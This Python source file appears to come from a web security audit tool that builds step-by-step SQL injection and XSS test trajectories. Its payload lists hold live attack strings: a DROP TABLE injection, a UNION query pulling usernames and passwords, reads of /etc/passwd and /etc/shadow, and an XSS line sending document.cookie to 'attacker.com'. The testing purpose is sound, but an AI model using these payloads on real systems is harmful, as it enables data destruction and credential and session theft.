"""
SecureAudit — Test Trajectory Engine
Decomposes high-level audit goals into atomic, executable test steps.
Each step has: expected input → action to perform → assertion to verify.
"""
import uuid
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

logger = logging.getLogger(__name__)


class ActionType(str, Enum):
    HTTP_REQUEST = "HTTP_REQUEST"
    BROWSER_ACTION = "BROWSER_ACTION"
    ASSERTION = "ASSERTION"
    SETUP = "SETUP"
    TEARDOWN = "TEARDOWN"


class StepStatus(str, Enum):
    PENDING = "pending"
    RUNNING = "running"
    PASSED = "passed"
    FAILED = "failed"
    SKIPPED = "skipped"
    ERROR = "error"


@dataclass
class TestStep:
    """An atomic, executable test step."""
    step_number: int
    action: ActionType
    input_data: Any
    expected: str
    assertion: str
    status: StepStatus = StepStatus.PENDING
    actual_result: Optional[str] = None
    error_message: Optional[str] = None
    execution_time_ms: float = 0.0

    def to_dict(self) -> dict:
        return {
            "step_number": self.step_number,
            "action": self.action.value,
            "input_data": self.input_data,
            "expected": self.expected,
            "assertion": self.assertion,
            "status": self.status.value,
            "actual_result": self.actual_result,
            "error_message": self.error_message,
            "execution_time_ms": self.execution_time_ms,
        }


@dataclass
class TestTrajectory:
    """
    A complete test trajectory for a high-level audit goal.
    Decomposes the goal into atomic, ordered steps.
    """
    trajectory_id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    goal: str = ""
    vulnerability_class: str = ""
    severity: str = "Medium"
    steps: list[TestStep] = field(default_factory=list)
    preconditions: list[str] = field(default_factory=list)
    status: StepStatus = StepStatus.PENDING
    passed_steps: int = 0
    failed_steps: int = 0
    vulnerability_confirmed: bool = False
    evidence: str = ""
    remediation: str = ""

    def add_step(
        self,
        action: ActionType,
        input_data: Any,
        expected: str,
        assertion: str,
    ) -> "TestTrajectory":
        """Add an atomic step to the trajectory (fluent interface)."""
        step = TestStep(
            step_number=len(self.steps) + 1,
            action=action,
            input_data=input_data,
            expected=expected,
            assertion=assertion,
        )
        self.steps.append(step)
        return self

    def mark_step_result(
        self,
        step_number: int,
        status: StepStatus,
        actual_result: str,
        execution_time_ms: float = 0.0,
        error_message: Optional[str] = None,
    ):
        """Record the result of a test step execution."""
        for step in self.steps:
            if step.step_number == step_number:
                step.status = status
                step.actual_result = actual_result
                step.execution_time_ms = execution_time_ms
                step.error_message = error_message

                if status == StepStatus.PASSED:
                    self.passed_steps += 1
                elif status in (StepStatus.FAILED, StepStatus.ERROR):
                    self.failed_steps += 1
                break

    def to_dict(self) -> dict:
        return {
            "trajectory_id": self.trajectory_id,
            "goal": self.goal,
            "vulnerability_class": self.vulnerability_class,
            "severity": self.severity,
            "status": self.status.value,
            "preconditions": self.preconditions,
            "steps": [s.to_dict() for s in self.steps],
            "passed_steps": self.passed_steps,
            "failed_steps": self.failed_steps,
            "total_steps": len(self.steps),
            "vulnerability_confirmed": self.vulnerability_confirmed,
            "evidence": self.evidence,
            "remediation": self.remediation,
        }


class TrajectoryEngine:
    """
    Decomposes high-level audit goals into atomic test trajectories.

    For each vulnerability class, produces a sequence of steps:
    1. SETUP — prepare the test environment / auth state
    2. HTTP_REQUEST — craft and send the attack payload
    3. ASSERTION — verify the server response for vulnerability indicators
    4. TEARDOWN — clean up any created resources
    """

    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "1; SELECT SLEEP(5)--",
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        "'\"><script>fetch('https://attacker.com?c='+document.cookie)</script>",
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "/var/www/../../etc/shadow",
    ]

    def build_sqli_trajectory(self, endpoint: str, parameter: str) -> TestTrajectory:
        """Build SQL injection test trajectory."""
        trajectory = TestTrajectory(
            goal=f"Verify SQL injection vulnerability in parameter '{parameter}' at {endpoint}",
            vulnerability_class="sqli",
            severity="Critical",
            preconditions=[
                "Target application is running",
                f"Endpoint {endpoint} accepts {parameter} parameter",
            ],
        )

        trajectory.add_step(
            action=ActionType.SETUP,
            input_data={"endpoint": endpoint, "parameter": parameter},
            expected="Baseline response established",
            assertion="Record normal response for comparison",
        ).add_step(
            action=ActionType.HTTP_REQUEST,
            input_data={
                "method": "POST",
                "url": endpoint,
                "payload": {parameter: self.SQLI_PAYLOADS[0]},
                "headers": {"Content-Type": "application/json"},
            },
            expected="Server should return 400 or sanitised error — NOT SQL error details",
            assertion="Response must NOT contain 'sql', 'mysql', 'syntax error', 'ORA-', 'SQLSTATE'",
        ).add_step(
            action=ActionType.HTTP_REQUEST,
            input_data={
                "method": "POST",
                "url": endpoint,
                "payload": {parameter: self.SQLI_PAYLOADS[3]},  # Time-based blind
            },
            expected="Response time should be < 2s if no SQLi; > 5s if vulnerable",
            assertion="If response_time > 5000ms, time-based blind SQLi confirmed",
        ).add_step(
            action=ActionType.ASSERTION,
            input_data={"check": "error_disclosure"},
            expected="No database error messages in response body",
            assertion="Scan response for SQL error keywords; fail if found",
        )

        return trajectory

    def build_xss_trajectory(self, endpoint: str, parameter: str) -> TestTrajectory:
        """Build XSS test trajectory."""
        trajectory = TestTrajectory(
            goal=f"Verify XSS vulnerability in parameter '{parameter}' at {endpoint}",
            vulnerability_class="xss",
            severity="High",
            preconditions=[
                "Target application is running",
                f"Endpoint {endpoint} reflects or stores the '{parameter}' parameter",
            ],
        )

        trajectory.add_step(
            action=ActionType.SETUP,
            input_data={"canary": f"XSSCANARY{uuid.uuid4().hex[:8]}"},
            expected="Canary token stored for reflected output tracking",
            assertion="Record canary for later response scanning",
        ).add_step(
            action=ActionType.HTTP_REQUEST,
            input_data={
                "method": "POST",
                "url": endpoint,
                "payload": {parameter: self.XSS_PAYLOADS[0]},
            },
            expected="Script tags should be escaped or rejected",
            assertion="Response must NOT contain unescaped '<script>' tags",
        ).add_step(
            action=ActionType.HTTP_REQUEST,
            input_data={
                "method": "GET",
                "url": f"{endpoint}?{parameter}={self.XSS_PAYLOADS[1]}",
            },
            expected="Image onerror handler must be sanitised",
            assertion="Response must NOT contain 'onerror=alert'",
        ).add_step(
            action=ActionType.ASSERTION,
            input_data={"check": "content_type"},
            expected="Response Content-Type should include 'text/html; charset=utf-8'",
            assertion="Check X-XSS-Protection and Content-Security-Policy headers present",
        )

        return trajectory

    def build_from_test_cases(self, test_cases: list[dict]) -> list[TestTrajectory]:
        """
        Convert LLM-generated test cases into executable TestTrajectory objects.
        """
        trajectories = []

        for tc in test_cases:
            trajectory = TestTrajectory(
                goal=tc.get("name", "Unnamed test"),
                vulnerability_class=tc.get("vulnerability_class", "unknown"),
                severity=tc.get("severity", "Medium"),
                preconditions=tc.get("preconditions", []),
                remediation=tc.get("remediation", ""),
            )

            for step_data in tc.get("steps", []):
                trajectory.add_step(
                    action=ActionType(step_data.get("action", "HTTP_REQUEST")),
                    input_data=step_data.get("input", ""),
                    expected=step_data.get("expected", ""),
                    assertion=step_data.get("assertion", ""),
                )

            trajectories.append(trajectory)
            logger.debug(f"Built trajectory: {trajectory.goal} with {len(trajectory.steps)} steps")

        return trajectories
